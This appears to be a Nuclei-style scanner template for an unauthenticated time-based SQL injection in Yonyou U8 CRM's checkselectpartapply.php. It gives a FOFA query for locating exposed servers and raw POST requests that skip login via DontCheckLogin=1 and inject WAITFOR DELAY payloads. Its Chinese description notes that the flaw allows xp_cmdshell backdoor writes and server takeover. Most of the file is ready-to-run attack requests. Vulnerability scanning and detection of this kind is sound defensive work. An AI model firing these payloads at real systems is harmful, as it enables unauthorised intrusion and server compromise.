id: yongyouU8-CRM-checkselectpartapply_php-sql-time

info:
  name: 用友U8 CRM checkselectpartapply.php SQL注入漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: app="用友U8CRM"
    用友U8 CRM checkselectpartapply.php 接口存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xpcmdshell写入后门文件，执行任意代码，从而获取到服务器权限。
  reference:
    - https://mp.weixin.qq.com/s/2zKhVQzF7mpwxz06-B3awg
  tags: sql injection

http:
  - raw:
      - |
        POST /partrtn/checkselectpartapply.php?DontCheckLogin=1 HTTP/1.1
        Host: {{Hostname}}
        Cookie: PHPSESSID=bgsesstimeout-;
        Content-Type: application/x-www-form-urlencoded; charset=utf-8

        applyIDs=1);WAITFOR+DELAY+'0:0:4'--
      - |
        POST /partrtn/checkselectpartapply.php?DontCheckLogin=1 HTTP/1.1
        Host: {{Hostname}}
        Cookie: PHPSESSID=bgsesstimeout-;
        Content-Type: application/x-www-form-urlencoded; charset=utf-8

        applyIDs=1);WAITFOR+DELAY+'0:0:8'--
    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and